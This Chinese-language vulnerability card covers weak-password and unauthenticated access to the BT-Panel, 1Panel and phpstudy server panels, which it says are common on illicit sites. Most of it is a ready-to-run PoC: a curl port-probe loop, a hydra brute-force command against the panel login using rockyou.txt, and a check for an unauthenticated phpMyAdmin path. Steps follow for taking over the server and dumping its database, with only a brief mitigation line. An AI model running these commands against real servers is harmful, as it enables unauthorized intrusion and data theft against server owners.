---
title: 宝塔 / 1Panel 面板弱口令与未授权（黑灰站最常见后台）
cve: 无（配置缺陷）
severity: critical
cvss: 9.2
product: 宝塔面板（BT-Panel）/ 1Panel / 小皮 phpstudy
versions: 任意
ports: 8888, 888, 8443, 2087, 9999
keywords: 宝塔, bt, 1panel, 面板, 弱口令, 未授权, 服务器
entry: :8888/<随机入口> 或 :8888/login
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET http://target:8888/        → 宝塔登录页 / 301 到随机入口
GET http://target:9999/        → 1Panel 登录页
页面 title/logo 含 BT-Panel / 1Panel
```

## 前置条件

- 面板端口对外开放（黑灰站运维常图省事）。

## PoC

```bash
# 1) 探面板
for p in 8888 888 8443 2087 9999; do
  echo "== $p"; curl -s -o /dev/null -w '%{http_code}\n' --max-time 4 "http://target:$p/"
done

# 2) 默认/弱口令（宝塔 6.x 曾默认 admin/随机，7.x 常被改成弱口令）
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  '/login:username=^USER^&password=^PASS^:用户名或密码错误'

# 3) 宝塔常见历史未授权（旧版本 phpmyadmin 目录可直连）
curl -s -o /dev/null -w '%{http_code}\n' 'http://target:888/pma/'
# 判定：pma 200 且可无密码进 = 直接拖库
```

## 利用步骤

1. 先扫端口与登录页（只读）；
2. 弱口令（10~20 个常见）不行就转 CVE/未授权；
3. 进面板即可建库、改文件、看计划任务——等于拿下服务器；
4. 证据：面板 200 + 登录成功页（打码 IP）。

## 修复与缓解

- 面板只监听内网/加 IP 白名单；强口令 + 两步验证；关闭 phpmyadmin 直连。

## 参考

- 宝塔/1Panel 官方安全建议。
